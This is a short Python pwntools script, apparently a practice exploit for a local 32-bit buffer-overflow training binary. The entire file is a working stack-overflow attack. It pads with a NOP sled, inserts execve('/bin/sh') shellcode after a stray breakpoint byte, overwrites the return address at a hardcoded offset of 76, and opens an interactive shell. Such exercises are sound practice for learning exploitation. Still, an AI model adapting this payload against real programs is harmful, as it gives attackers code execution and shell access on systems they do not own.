from pwn import *

filename = "/root/Escritorio/BOF/TryHarder/X4v1l0k/Vuln1/x32/vuln1"

#e = ELF(filename)
context.update(arch='i386')
#context.log_level = 'DEBUG'

eip = "\x10\xd0\xff\xff"

offset = 76

post_shellcode = "\x90" * 8

shellcode = asm(shellcraft.execve('/bin/sh'))

pre_shellcode = "\x90" * (offset - len(shellcode) - len(post_shellcode))

payload = pre_shellcode + "\xcc" + shellcode + post_shellcode + eip

p = process([filename, payload])

p.interactive()